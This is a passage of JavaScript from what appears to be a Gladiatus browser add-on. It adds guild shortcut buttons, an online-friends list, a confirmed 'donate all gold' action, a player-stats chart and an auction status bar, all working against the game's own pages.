						if(activeButtons.indexOf("gbn") >= 0){
							let instant_donate_gold = document.createElement('div');
							instant_donate_gold.className = "instant_message_div instant";
							instant_donate_gold.style.display = "none";
							let div = document.createElement('div');
							div.className = "hover_box";
							let input = document.createElement('input');
							input.type = "button";
							input.id = "donate_all_button";
							input.className = "button1";
							input.value = gca_locale.get("global", "donate_gold_all_gold");
							input.addEventListener('click', () => {
								this.donate_gold.check();
							}, false);
							div.appendChild(input);
							instant_donate_gold.appendChild(div);

							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon gold-icon";
							link.href = gca_getPage.link({"mod":"guildBankingHouse"});
							link.title = gca_locale.get("global", "guild_bank_goto");
							button.appendChild(link);
							button.appendChild(instant_donate_gold);
							shortcutsBar.appendChild(button);

							button.addEventListener('mouseover', function(){
								jQuery(instant_donate_gold).stop().fadeIn("fast");
							}, false);
							button.addEventListener('mouseout', function(){
								jQuery(instant_donate_gold).stop().fadeOut("fast");
							}, false);
						}
						
						// Create a Link to guild's baths vox 1
						if(activeButtons.indexOf("gbt") >= 0){
							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon bathtub-icon";
							link.href = gca_getPage.link({"mod":"guild_bath","submod":"guild_shoutbox"});
							link.title = gca_locale.get("global", "guild_baths_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}

						// Create a Link to guild's war camp
						if(activeButtons.indexOf("gwr") >= 0){
							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon report-icon";
							link.href = gca_getPage.link({"mod":"guild_warcamp"});
							link.title = gca_locale.get("global", "guild_warcamp_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}
						
						// Create a Link to guild's arena battle reports
						if(activeButtons.indexOf("gar") >= 0){
							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon report2-icon";
							link.href = gca_getPage.link({"mod":"guild_warcamp","submod":"guild_member_reports"});
							link.title = gca_locale.get("global", "guild_arenareports_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}
						
						// Create a Link to guild's jail
						if(activeButtons.indexOf("gjl") >= 0){
							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon castle-icon";
							link.href = gca_getPage.link({"mod":"guild_jail"});
							link.title = gca_locale.get("global", "guild_jail_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}
						
						// Create a Link to guild's library
						if(activeButtons.indexOf("glb") >= 0){
							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon notebook-icon";
							link.href = gca_getPage.link({"mod":"guildLibrary"});
							link.title = gca_locale.get("global", "guild_library_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}
						
						// Create a Link to guild's templum
						if(activeButtons.indexOf("gtm") >= 0){
							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon pillar-icon";
							link.href = gca_getPage.link({"mod":"guildTemple"});
							link.title = gca_locale.get("global", "guild_templum_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}
						
						// Create a Link to food auction
						if(activeButtons.indexOf("fau") >= 0){
							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon food-icon";
							link.href = gca_getPage.link({mod : 'auction', itemType : '7'});
							link.title = gca_locale.get("global", "auction_food_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}

					}
				}

				// Link to the simulator page
				if(activeButtons.indexOf("sim") >= 0){
					button = document.createElement('div');
					button.className = "icon-out";
					link = document.createElement('a');
					link.className = "icon swords-icon";
					link.href = gca_links.get('gladiatus-simulator');
					link.title = gca_locale.get("global", "simulator_goto");
					link.setAttribute("target", "_blank");
					button.appendChild(link);
					shortcutsBar.appendChild(button);
				}
				
				// Display your player stats
				if(activeButtons.indexOf("stt") >= 0){
					let table_wrapper = document.createElement("div");
					table_wrapper.className = "hover_box";
					let statsHtmlTable = document.createElement("table");
					statsHtmlTable.id = "gca_player_stats_table";
					
					// Add Canvas
					var canvas = document.createElement('canvas');
					canvas.id = "stats_canvas";
					canvas.style = "background-color:rgba(255,255,255,0.8);border-radius:5%";
					table_wrapper.appendChild(canvas);

					let show_stats = document.createElement('div');
					show_stats.className = "instant";
					show_stats.id = "gca_player_stats";
					show_stats.style.display = "none";
					show_stats.appendChild(table_wrapper);
					table_wrapper.appendChild(statsHtmlTable);

					// Refresh button
					link = document.createElement('a');
					link.className = "gca-icon refresh-icon";
					link.addEventListener('click', () => {
						this.playerStats.refresh();
					}, false);
					table_wrapper.appendChild(link);
					// Refresh spacer
					let spacer = document.createElement('div');
					spacer.style.height = "26px";
					table_wrapper.appendChild(spacer);
					
					// Shortcut button
					button = document.createElement('div');
					button.className = "icon-out";
					link = document.createElement('a');
					link.className = "icon people-icon";
					link.title = gca_locale.get("global", "stats_display");
					button.appendChild(link);
					button.appendChild(show_stats);
					shortcutsBar.appendChild(button);

					link.addEventListener('click', () => {
						this.playerStats.create();
						jQuery(show_stats).fadeToggle();
					}, false);
				}
				
				// Display Online Players
				if (activeButtons.indexOf("onl") >= 0) {
					button = document.createElement('div');
					button.className = "icon-out";
					link = document.createElement('a');
					link.className = "icon online-icon";
					link.title = gca_locale.get("global", "online_display");
					button.appendChild(link);
					shortcutsBar.appendChild(button);

					button.addEventListener('click', () => {
						this.online_friends.open();
					}, false);
				}

				document.getElementById('header_game').appendChild(shortcutsBar);
			},

			// Hide/Display Online Friends
			online_friends : {
				// Online Friends Dialog
				dialog : false,

				// Open Dialog
				open : function(){
					if(!this.dialog){
						// Create a dialog
						var dialog = new gca_build.dialog;
						dialog.smallHead(true);
						dialog.title.textContent = gca_locale.get("global", "online_friends");

						// Temp elements variables
						var table, tr, td, div, span;

						// Headers
						table = document.createElement('table');
						table.className = "online_friends_table";
						tr = document.createElement('tr');
						td = document.createElement('td');
						td.setAttribute("width", "50%");
						td.textContent = gca_locale.get("global", "guild_friends") + " ";
						span = document.createElement('span');
						span.id = "online_friends_guild_counter";
						td.appendChild(span);
						tr.appendChild(td);
						td = document.createElement('td');
						td.setAttribute("width", "50%");
						td.textContent = gca_locale.get("global", "family_friends") + " ";
						span = document.createElement('span');
						span.id = "online_friends_family_counter";
						td.appendChild(span);
						tr.appendChild(td);
						table.appendChild(tr);
						dialog.body.appendChild(table);

						// Loading
						table = document.createElement('table');
						table.className = "online_friends_table";
						tr = document.createElement('tr');
						td = document.createElement('td');
						td.setAttribute("width", "50%");
						div = document.createElement('div');
						div.id = "online_guild_friends";
						td.appendChild(div);
						tr.appendChild(td);
						td = document.createElement('td');
						td.setAttribute("width", "50%");
						div = document.createElement('div');
						div.id = "online_family_friends";
						td.appendChild(div);
						tr.appendChild(td);
						table.appendChild(tr);
						dialog.body.appendChild(table);

						// Add some space
						div = document.createElement('div');
						div.className = "space";
						dialog.body.appendChild(div);

						// Save dialog variable
						this.dialog = dialog;

						// Add refresh Button
						var button = document.createElement('a');
						button.className = "gca-icon refresh-icon";
						button.style.marginRight = "10px";
						dialog.body.appendChild(button);

						button.addEventListener('click', () => {
							this.refresh();
						}, false);

						// Add close Button
						button = document.createElement('input');
						button.className = "button3";
						button.type = "button";
						button.value = gca_locale.get("general", "close");
						dialog.body.appendChild(button);

						button.addEventListener('click', function(){
							dialog.close();
						}, false);
					}

					// Refresh Dialog
					this.refresh();
					// Display Dialog
					this.dialog.open();
				},

				// Refresh
				refresh : function(){
					// Clear Lists
					document.getElementById('online_guild_friends').textContent = "";
					document.getElementById('online_family_friends').textContent = "";
					document.getElementById("online_friends_guild_counter").textContent = "";
					document.getElementById("online_friends_family_counter").textContent = "";
					// Display loading
					document.getElementById('online_guild_friends').className = "online_friends_loading_img loading";
					document.getElementById('online_family_friends').className = "online_friends_loading_img loading";

					// Get online guild members
					jQuery.get(gca_getPage.link({"mod":"guild","submod":"memberList","order":"o"}), function(content){
						// Match All active players
						var online_players = content.match(/<tr>\s*<td>\s*<a href="index\.php\?mod=player&p=(\d+)&sh=[^"]+">([^<]+)<\/a>\s*<\/td>\s*<td>([^<]+)<\/td>\s*<td>(\d+)<\/td>\s*<td align="right">\s*[^<]*(<span[^>]*>[^<]*<\/span>|)\s*<\/td>\s*<td align="right"><span style="color: (green|#406000|#804000);[^"]*" title="[^"]*">([^<]*)</mg);
						
						// Check if you are on a guild
						if(!online_players && content.match(/<form\s+action="index.php\?mod=guild&submod=create&sh=/i)){
							// Save that you are not on guild
							if(gca_data.section.get("guild", "inGuild", false)){
								gca_data.section.set("guild", "inGuild", false);
								gca_data.section.del("guild", "mates");
								gca_data.section.del("guild", "name");
							}
						}
						// You are in a guild, so update guild data
						else{
							let guild_players_data = content.match(/<tr>\s*<td>\s*<a href="index\.php\?mod=player&p=(\d+)&sh=[^"]+">([^<]+)<\/a>\s*<\/td>\s*<td>([^<]+)<\/td>\s*<td>(\d+)<\/td>\s*<td align="right">\s*[^<]*(<span[^>]*>[^<]*<\/span>|)\s*<\/td>\s*<td align="right"><span style="color:[^>]+>([^<]*)</mg);
							let guild_players = [];
						
							// For each player
							for (let i = 0; i < guild_players_data.length; i++){
								// Match player's info
								let player = guild_players_data[i].match(/<tr>\s*<td>\s*<a href="index\.php\?mod=player&p=(\d+)&sh=[^"]+">([^<]+)<\/a>\s*<\/td>\s*<td>([^<]+)<\/td>\s*<td>(\d+)<\/td>\s*<td align="right">\s*[^<]*(<span[^>]*>[^<]*<\/span>|)\s*<\/td>\s*<td align="right"><span style="color:[^>]+>([^<]*)</mi);
								let player_info = {
									id : player[1],
									name : player[2],
									rank : player[3],
									level : player[4]
								};
								player_info.name = gca_tools.strings.trim(player_info.name);
								player_info.rank = gca_tools.strings.trim(player_info.rank);
								// Update guild players
								guild_players.push(player_info);
							}

							// If guild players, update them
							if(guild_players.length > 0){
								// Update guild data
								gca_data.section.set("guild", "inGuild", true);
								gca_data.section.set("guild", "mates", guild_players);
								
								let guild_name = content.match(/<h2 class="section-header">([^<]+)<\/h2>/)[1];
								guild_name = guild_name.match(/([a-zA-Z0-9\-#@\[\]\.\+\:\*_]+) \[([^\]]+)\]/i)[1];
								gca_data.section.set("guild", "name", guild_name);
							}
						}

						// If no players found
						if(!online_players){
							online_players = [];
						}
						

						// List with parsed players info
						var player_list = [];
						// For each player
						for (let i = 0; i < online_players.length; i++){
							// Match player's info
							let player = online_players[i].match(/<tr>\s*<td>\s*<a href="index\.php\?mod=player&p=(\d+)&sh=[^"]+">([^<]+)<\/a>\s*<\/td>\s*<td>([^<]+)<\/td>\s*<td>(\d+)<\/td>\s*<td align="right">\s*[^<]*(<span[^>]*>[^<]*<\/span>|)\s*<\/td>\s*<td align="right"><span style="color: (green|#406000|#804000);[^"]*" title="[^"]*">([^<]*)</mi);
							let player_info = {
								id : player[1],
								name : player[2],
								rank : player[3],
								level : player[4],
								color : player[6],
								time : player[7]
							};
							player_info.name = gca_tools.strings.trim(player_info.name);
							player_info.rank = gca_tools.strings.trim(player_info.rank);

							// If not This player, add him to the list
							if(player_info.id != gca_section.playerId)
								player_list.push(player_info);
						}

						var parent = document.getElementById('online_guild_friends');
						var countElement = document.getElementById("online_friends_guild_counter");
						// Remove loading
						parent.removeAttribute('class');
						// If no players online
						if(player_list.length == 0){
							var noPlayers = document.createElement('div');
							noPlayers.style.textAlign = "center";
							noPlayers.textContent = "-";
							parent.appendChild(noPlayers);
							countElement.textContent = "";
							parent.parentNode.setAttribute('style','vertical-align:middle;');
						}
						// If many players found
						else{
							// If too many players found
							if(player_list.length >= 10){
								parent.setAttribute('style','overflow:auto;height:200px;');
							}else{
								parent.removeAttribute('style');

							}
							parent.parentNode.setAttribute('style','vertical-align:top;');
							// For each player
							for (let i = 0; i < player_list.length; i++){
								let sentMsg = document.createElement('a');
								sentMsg.className = "private-message-icon";
								sentMsg.href = gca_getPage.link({"mod":"messages","submod":"messageNew","profileName":player_list[i].name});
								parent.appendChild(sentMsg);
								let bull = document.createElement('font');
								bull.setAttribute("color", player_list[i].color);
								bull.textContent = "\u25cf";
								parent.appendChild(bull);
								parent.appendChild( document.createTextNode(' ') );
								let name = document.createElement('a');
								name.href = gca_getPage.link({"mod":"player","p":player_list[i].id});
								name.style.color = "black";
								name.style.fontFamily = "century gothic";
								name.textContent = player_list[i].name;
								name.title = player_list[i].time;
								parent.appendChild(name);
								parent.appendChild( document.createTextNode(' ') );
								let info = document.createElement('span');
								info.style.fontSize = "0.8em";
								info.style.color = "#525252";
								info.textContent = "[lv" + player_list[i].level + " - " + player_list[i].rank + "]";
								parent.appendChild(info);
								parent.appendChild( document.createElement('br') );
							}
							countElement.textContent = "(" + player_list.length + ")";
						}
					});
					
					// Get online family members
					jQuery.get(gca_getPage.link({"mod":"overview","submod":"buddylist"}), function(content){
						// Match All active players
						let online_players = content.match(/<a href="index\.php\?mod=player&p=[^>]+>([^<]+)<\/a>\s*<\/td>\s*<td>(?:<a href="index\.php\?mod=guild&i=[^>]+>[^<]+<\/a>\s*|-*\s*)<\/td>\s*<td>(\d+)<\/td>\s*<td><span style="color: (green|#406000|#804000);[^>]+>([^<]*)</mg);
						if(!online_players) online_players = [];
						// List with parsed players info
						let player_list = [];
						// For each player
						for (let i = 0; i < online_players.length; i++){
							// Match player's info
							let player_link = online_players[i].match(/<a href="index\.php\?mod=player&p=(\d+)[^>]+>([^<]+)<\/a>/mi);
							let player_guild = online_players[i].match(/<a href="index\.php\?mod=guild&i=(\d+)[^>]+>\s*\[([^\]]+)\]\s*<\/a>/mi);
							let player_info = online_players[i].match(/<td>(\d+)<\/td>\s*<td><span style="color: (green|#406000|#804000);[^>]+>([^<]*)</mi);
							let player = {
								id : player_link[1],
								name : player_link[2],
								guild : {
									id : player_guild ? player_guild[1] : '-',
									name : player_guild ? player_guild[2] : '-'
								},
								level : player_info[1],
								color : player_info[2],
								time : player_info[3]
							};
							player.name = gca_tools.strings.trim(player.name);
							player.guild.name = gca_tools.strings.trim(player.guild.name);
							if (player.guild.name == '-') player.guild = null;
							player_list.push(player);
						}

						let parent = document.getElementById('online_family_friends');
						let countElement = document.getElementById("online_friends_family_counter");
						// Remove loading
						parent.removeAttribute('class');
						// If no players online
						if (player_list.length == 0) {
							let noPlayers = document.createElement('div');
							noPlayers.style.textAlign = "center";
							noPlayers.textContent = "-";
							parent.appendChild(noPlayers);
							countElement.textContent = "";
							parent.parentNode.setAttribute('style','vertical-align:middle;');
						}
						// If many players found
						else {
							// If too many players found
							if (player_list.length >= 10) {
								parent.setAttribute('style','overflow:auto;height:200px;');
							} else {
								parent.removeAttribute('style');
							}
							parent.parentNode.setAttribute('style','vertical-align:top;');
							// For each player
							for (let i = 0; i < player_list.length; i++){
								let sentMsg = document.createElement('a');
								sentMsg.className = "private-message-icon";
								sentMsg.href = gca_getPage.link({"mod":"messages","submod":"messageNew","profileName":player_list[i].name});
								parent.appendChild(sentMsg);
								let bull = document.createElement('font');
								bull.setAttribute("color", player_list[i].color);
								bull.textContent = "\u25cf";
								parent.appendChild(bull);
								parent.appendChild( document.createTextNode(' ') );
								let name = document.createElement('a');
								name.href = gca_getPage.link({"mod":"player","p":player_list[i].id});
								name.style.color = "black";
								name.style.fontFamily = "century gothic";
								name.textContent = player_list[i].name;
								name.title = player_list[i].time;
								parent.appendChild(name);
								parent.appendChild( document.createTextNode(' ') );
								let info = document.createElement('span');
								info.style.fontSize = "0.8em";
								info.style.color = "#525252";
								info.appendChild( document.createTextNode("[lv" + player_list[i].level + (player_list[i].guild ? " - " : "")) );
								if (player_list[i].guild) {
									let guild = document.createElement('a');
									guild.href = gca_getPage.link({"mod":"guild","submod":"forumGladiatorius","i":player_list[i].guild.id});
									guild.style.color = "#525252";
									guild.textContent = player_list[i].guild.name;
									info.appendChild(guild);
								}
								info.appendChild( document.createTextNode("]") );
								parent.appendChild(info);
								parent.appendChild( document.createElement('br') );
							}
							countElement.textContent = "(" + player_list.length + ")";
						}
					});
				}
			},

			// Donate All button
			donate_gold : {

				// Create confirm modal
				check : function(){
					// Get gold with dots
					var gold_txt = gca_tools.strings.trim(document.getElementById('sstat_gold_val').textContent);
					// Parse gold in number
					var gold = parseInt(gca_tools.strings.removeDots(gold_txt), 10);
					
					// If no gold or parse failed
					if(gold == 0 || isNaN(gold)){
						// Show warning
						gca_notifications.warning(gca_locale.get("global", "donate_gold_no_gold"));
						return;
					}

					// Create confirm modal
					var modal = new gca_tools.Modal(
						gca_locale.get("global", "donate_gold_all_gold"),
						null,
						() => {
							this.donate(gold);
							modal.destroy();
						},
						() => {
							modal.destroy();
						}
					);
					modal.body(gca_locale.get("global", "donate_gold_confirm", {number : gold_txt}));
					modal.button(gca_locale.get("general", "confirm"), true);
					modal.button(gca_locale.get("general", "cancel"), false);
					modal.show();
				},

				// Donate gold
				donate : function(gold){
					if(gold == 0)
						gca_notifications.warning( gca_locale.get("global", "donate_gold_no_gold") );

					// Clear Gold
					document.getElementById('sstat_gold_val').textContent = "";
					// Display Loading
					var loading = document.createElement('div');
					loading.className = "loading";
					loading.marginTop = "6px";
					loading.opacity = "0.8";
					document.getElementById('sstat_gold_val').appendChild(loading);

					// Post to the server
					jQuery.ajax({
						type: "POST",
						url: gca_getPage.link({"mod":"guildBankingHouse","submod":"donate"}),
						data: 'donation=' + gold + '&doDonation=Donate All',
						success: function(html){
							let gold_left = 0;
							let match = html.match(/<div class="headervalue_small" id="sstat_gold_val">([^<]+)<\/div>/);
							if (match) {
								gold_left = parseInt(gca_tools.strings.removeDots(match[1]), 10);
							}

							document.getElementById('sstat_gold_val').textContent = gca_tools.strings.insertDots(gold_left);
							gca_notifications.success(gca_locale.get("global", "donate_gold_success"));
						},
						error: function(){
							document.getElementById('sstat_gold_val').textContent = gca_tools.strings.insertDots(gold);
							gca_notifications.error(gca_locale.get("global", "donate_gold_failed"));
						}
					});
				}

			},

			// Player stats
			playerStats : {
				// Create table with stats
				create : function(){
					// Get stats
					var stats = gca_data.section.get("stats", "player", false);
					// Get Container
					var statsHtmlTable = document.getElementById("gca_player_stats_table");

					var tr, td;
					// If stats are saved
					if(stats){
						let attributes = [
							"strength",
							"dexterity",
							"agility",
							"constitution",
							"charisma",
							"intelligence",
							"armour",
							"damage"
						];

						var new_table = document.createElement("table");
						new_table.id = "gca_player_stats_table";
						for(var i = 0; i < attributes.length; i++){
							tr = document.createElement("tr");
							td = document.createElement("td");
							td.textContent = stats[attributes[i]][0];
							tr.appendChild(td);
							td = document.createElement("td");
							td.textContent = ":";
							tr.appendChild(td);
							td = document.createElement("td");
							td.className = "cssAlign";
							td.textContent = stats[attributes[i]][1];
							tr.appendChild(td);
							new_table.appendChild(tr);
						}
						statsHtmlTable.parentNode.replaceChild(new_table, statsHtmlTable);
						
						var chartFunction = function(){
							new Chart(document.getElementById("stats_canvas"), {
								type: 'radar',
								data: {
									labels: [stats[attributes[0]][0], stats[attributes[1]][0], stats[attributes[2]][0], stats[attributes[3]][0], stats[attributes[4]][0], stats[attributes[5]][0]],
									datasets: [{
										label: "Stats",
										fill: true,
										backgroundColor: "rgba(179,181,198,0.2)",
										borderColor: "rgba(179,181,198,1)",
										pointBackgroundColor: "rgba(179,181,198,1)",
										pointBorderColor: "#fff",
										data: [stats[attributes[0]][1], stats[attributes[1]][1], stats[attributes[2]][1], stats[attributes[3]][1], stats[attributes[4]][1], stats[attributes[5]][1]]
									}]
								},
								options: {
									scale: {
										pointLabels: {
											fontSize: 8
										}
									},
									legend: {
										display: false
									}
								}
							});
						}
						
						gca_global.scripts.chartScript.create(chartFunction);
					}
					// Stats not saved
					else {
						let statsHtmlTable = document.getElementById("gca_player_stats_table");
						new_table = document.createElement("table");
						new_table.id = "gca_player_stats_table";
						tr = document.createElement("tr");
						td = document.createElement("td");
						td.textContent = gca_locale.get("general", "no_data");
						tr.appendChild(td);
						new_table.appendChild(tr);
						statsHtmlTable.parentNode.replaceChild(new_table, statsHtmlTable);
					}
				},
				// loading
				loading : false,
				// Refresh data
				refresh : function(){
					// Check if loading
					if(this.loading) return;
					this.loading = true;

					// Get Container
					var statsHtmlTable = document.getElementById("gca_player_stats_table");

					// Display loading
					var new_table = document.createElement("table");
					new_table.id = "gca_player_stats_table";
					var tr = document.createElement("tr");
					var td = document.createElement("td");
					var span = document.createElement("span");
					span.className = "loading";
					td.appendChild(span);
					tr.appendChild(td);
					new_table.appendChild(tr);
					statsHtmlTable.parentNode.replaceChild(new_table, statsHtmlTable);

					// Save instance
					var self = this;

					// Get stats
					this.get(function(stats){
						// Stop loading
						self.loading = false;

						if(stats){
							// Save stats
							gca_data.section.set("stats", "player", {
								strength : [stats.strengthName, stats.strength],
								dexterity : [stats.dexterityName, stats.dexterity],
								agility : [stats.agilityName, stats.agility],
								constitution : [stats.constitutionName, stats.constitution],
								charisma : [stats.charismaName, stats.charisma],
								intelligence : [stats.intelligenceName, stats.intelligence],
								armour : [stats.armourName, stats.armour],
								damage : [stats.damageName, stats.damage],
							});
							// Show stats
							self.create();
						}
						
						else{
							// Error
							statsHtmlTable = document.getElementById("gca_player_stats_table");
							var new_table = document.createElement("table");
							new_table.id = "gca_player_stats_table";
							var tr = document.createElement("tr");
							var td = document.createElement("td");
							var span = document.createElement("span");
							span.textContent = gca_locale.get("general", "error");
							span.style.color = "red";
							td.appendChild(span);
							tr.appendChild(td);
							new_table.appendChild(tr);
							statsHtmlTable.parentNode.replaceChild(new_table, statsHtmlTable);
						}
					});
				},
				get : function(callback){
					// Get stats from overview
					jQuery.ajax({
						type: "GET",
						url: gca_getPage.link({"mod":"overview"}),
						success: function(content){
							var stats = {};

							var statNamesA = content.match(/<span\s+class="charstats_text"[^>]*>([^<]+)<\/span>/ig);
							var statNamesB = content.match(/<span\s+class="charstats_value21"[^>]*>([^<]+)<\/span>/ig);
							stats.strength = content.match(/<span\s+id="char_f0"[^>]*>(\d+)<\/span>/i);
							stats.dexterity = content.match(/<span\s+id="char_f1"[^>]*>(\d+)<\/span>/i);
							stats.agility = content.match(/<span\s+id="char_f2"[^>]*>(\d+)<\/span>/i);
							stats.constitution = content.match(/<span\s+id="char_f3"[^>]*>(\d+)<\/span>/i);
							stats.charisma = content.match(/<span\s+id="char_f4"[^>]*>(\d+)<\/span>/i);
							stats.intelligence = content.match(/<span\s+id="char_f5"[^>]*>(\d+)<\/span>/i);
							stats.armour = content.match(/<span\s+id="char_panzer"[^>]*>(\d+)<\/span>/i);
							stats.damage = content.match(/<span\s+id="char_schaden"[^>]*>(\d+\s*-\s*\d+)<\/span>/i);

							if(statNamesA.length < 8 || statNamesB.length < 4 || !stats.strength || !stats.dexterity || !stats.agility || !stats.constitution || !stats.charisma || !stats.intelligence || !stats.armour || !stats.damage){
								if(callback) callback(false);
							}
							
							stats.strengthName = statNamesA[2].match(/>([^<]+)</i)[1];
							stats.dexterityName = statNamesA[3].match(/>([^<]+)</i)[1];
							stats.agilityName = statNamesA[4].match(/>([^<]+)</i)[1];
							stats.constitutionName = statNamesA[5].match(/>([^<]+)</i)[1];
							stats.charismaName = statNamesA[6].match(/>([^<]+)</i)[1];
							stats.intelligenceName = statNamesA[7].match(/>([^<]+)</i)[1];
							stats.armourName = statNamesB[1].match(/>([^<]+)</i)[1];
							stats.damageName = statNamesB[2].match(/>([^<]+)</i)[1];

							stats.strength = stats.strength[1];
							stats.dexterity = stats.dexterity[1];
							stats.agility = stats.agility[1];
							stats.constitution = stats.constitution[1];
							stats.charisma = stats.charisma[1];
							stats.intelligence = stats.intelligence[1];
							stats.armour = stats.armour[1];
							stats.damage = stats.damage[1];

							if(callback) callback(stats);
						},
						error: function(){
							if(callback) callback(false);
						}
					});
				}
			}
		},

		// Auction Status bar create
		auction_status_bar : {
			// Create Bar
			create : function(){
				if(gca_options.bool("global","auction_status_bar")){
					// Auction status bar at the top-right corner
					let statusDiv = document.createElement("div");
					statusDiv.id = "AuctionStatusDiv";

					let table, tr, td;
					table = document.createElement("table");
					table.setAttribute("cellspacing","0");
					table.setAttribute("cellpadding","0");
					tr = document.createElement("tr");
					td = document.createElement("td");
					td.className = "auction_status_bg_left";
					tr.appendChild(td);
					td = document.createElement("td");
					td.className = "auction_status_bg_center";

					let auctionStatus1 = document.createElement("div");
					auctionStatus1.id = "auction_status_gladiator";
					td.appendChild(auctionStatus1);

					let loading = document.createElement("div");
					loading.className = "auction_status_loading_img loading";
					auctionStatus1.appendChild(loading);

					let auctionStatus2 = document.createElement("div");
					auctionStatus2.id = "auction_status_mercenary";
					td.appendChild(auctionStatus2);

					loading = document.createElement("div");
					loading.className = "auction_status_loading_img loading";
					auctionStatus2.appendChild(loading);

					tr.appendChild(td);
					td = document.createElement("td");
					td.className = "auction_status_bg_right";
					tr.appendChild(td);
					table.appendChild(tr);

					statusDiv.appendChild(table);
					document.getElementById("header_game").appendChild(statusDiv);
				}
				
				if(gca_options.bool("global","auction_status_bar") || gca_options.bool("global","auction_status_notification")){
					this.getStatus();
				}
			},

			// Get Status
			getStatus : function(){
				// Get gladiator auction status
				jQuery.get(gca_getPage.link({"mod":"auction","itemLevel":"999","itemQuality":"2"}), (content) => {
					this.parseStatus("gladiator", content);
				});

				// Get mercenary auction status
				jQuery.get(gca_getPage.link({"mod":"auction","ttype":"3","itemLevel":"999","itemQuality":"2"}), (content) => {
					this.parseStatus("mercenary", content);
				});
			},

			parseStatus : function(type, content){
				// Get Auction Name
				var auctionName = content.match(/class="awesome-tabs current">([^<]+)<\/a>/);
				// Get Auction Status
				var auctionStatus = content.match(/<span\s*class="description_span_right"><b>([^<]+)<\/b><\/span>/);

				// Get UI
				var statusUI = document.getElementById("auction_status_" + type);

				// Check for error
				if(!auctionName || !auctionStatus){
					if(statusUI)
						statusUI.textContent = gca_locale.get("general", "error");
					return;
				}

				// Parse
				auctionName = auctionName[1];
				auctionStatus = auctionStatus[1];

				// If status UI
				if(statusUI){
					statusUI.textContent = auctionName + ": " + auctionStatus;
				}

				// Status changed notification
				if(gca_options.bool("global","auction_status_notification")){
					// Get old status
					var oldStatus = gca_data.section.get("cache", "auction_status_"+type, false);
					if(oldStatus && oldStatus != auctionStatus){
						// Get link
						let linkUrl;
						if(type == "gladiator")
							linkUrl = gca_getPage.link(gca_data.section.get('cache', 'auction_last_search_gladiator', {mod : 'auction'}));
						else
							linkUrl = gca_getPage.link(gca_data.section.get('cache', 'auction_last_search_mercenary', {mod : 'auction', ttype : '3'}));
						// Display Message
						gca_notifications.info( auctionName + " : " + auctionStatus, linkUrl);
						// If sound notifications
						if(gca_options.bool("sound","cooldown_sound_notifications")){
							// Make a sound
							gca_audio.play("auction-status-change-notification");
						}
					}
				}
				// Save status
				gca_data.section.set("cache", "auction_status_" + type, auctionStatus);
			}
		},

		// Move event bar
		event_bar_move: {
		    moved: false,
		    preload: function() {
		        // Insert it on html tag
		        document.documentElement.classList.add("event_bar_moved");
		        // Set moved
		        this.moved = true;
		        // Fix for tall tabs
		        let tabs = document.getElementsByClassName("awesome-tabs");
		        let tallTabFound = false;
		        for (let i = tabs.length - 1; i >= 0; i--) {
		            if (tabs[i].textContent.length >= 19) { // more or equal than 19 characters
		                tallTabFound = true;
		            }
		        }
		        if (tallTabFound) {
		            document.getElementById("mainnav").classList.add("gca_long_tabs");
		        }
		    },
		    load: function() {
		        // Get banner
		        let banner = document.getElementById("banner_top");
		        let div = document.getElementById("banner_event");
		        // Check if active
		        if (banner && div && (banner.style.display === '' || banner.style.display === 'block')) {
		            if (!this.moved) {
		                gca_data.section.set("cache", "event_bar_active", 1);
		                this.preload();
		            }
		        }
		        // Remove class
		        else if (this.moved) {
		            gca_data.section.set("cache", "event_bar_active", 0);
		            document.documentElement.classList.remove("event_bar_moved");
		        }
		        // Applying Gladiatus Fixes banner after this
		        this.glfixesFeature();
		    },
		    // Apply Gladiatus Fixes banner if enabled
		    glfixesFeature: function() {
		        // Is enabled?
		        if (gca_options.bool("global", "gladiatus_site_fixes")) {
		            // Check the class first
		            if (!document.documentElement.classList.contains("glfix")) {
		                setTimeout(function() {
		                    document.documentElement.classList.add("glfix");
		                }, 0);
		            }
		        }
		    }
		},
		
		// Implement a top fixed bar to show important info on scroll
		top_fixed_bar : {
			// Elements to be moved to the top bar
			elements : {
				bar : {dom : null, scroll : 74, className : "bar-fixed-bar"},
				icon_gold : {dom : null, scroll : 74, className : "icon_gold-fixed-bar"},
				gold_val : {dom : null, scroll : 74, className : "gold_val-fixed-bar"},
				icon_rubies : {dom : null, scroll : 74, className : "icon_rubies-fixed-bar"},
				ruby_val : {dom : null, scroll : 74, className : "ruby_val-fixed-bar"},
				icon_expeditionpoints : {dom : null, scroll : 105, className : "icon_expeditionpoints-fixed-bar"},
				expeditionpoints_value : {dom : null, scroll : 105, className : "expeditionpoints_value-fixed-bar"},
				icon_dungeonpoints : {dom : null, scroll : 105, className : "icon_dungeonpoints-fixed-bar"},
				dungeonpoints_value : {dom : null, scroll : 105, className : "dungeonpoints_value-fixed-bar"},
				header_values_ressources : {dom : null, scroll : 74, className : "header_values_ressources-fixed-bar"},
				header_values_general : {dom : null, scroll : 74, className : "header_values_general-fixed-bar"},
				icon_arena : {dom : null, scroll : 105, className : "icon_arena-fixed-bar"},
				icon_grouparena : {dom : null, scroll : 105, className : "icon_grouparena-fixed-bar"},
				header_values_hp : {dom : null, scroll : 115, className : "header_values_hp-fixed-bar"},
				show_premium_days : {dom : null, scroll : 74, className : "show_premium_days-fixed-bar"},
				header_menu : {dom : null, scroll : 88, className : "header_menu-fixed-bar"}
			},
			// Create Top Bar
			create : function(){
				// Set up the "Top Fixed Bar"
				var div = document.createElement("div");
				div.id = "topFixedBar";
				var link = document.createElement("a");
				link.href = gca_links.get('addon-page');
